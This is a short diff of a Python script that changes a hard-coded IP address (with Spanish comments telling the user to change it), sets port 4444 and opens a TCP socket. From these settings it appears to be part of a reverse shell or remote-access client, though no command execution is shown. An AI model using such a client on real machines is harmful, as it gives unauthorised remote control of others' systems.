@@ -7,7 +7,7 @@ import time
 import base64
 from time import sleep
  
-r = "192.168.0.80" #Cambia Esto!
+r = "192.168.0.70" #Cambia Esto!
 p = 4444 #Cambia esto!
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
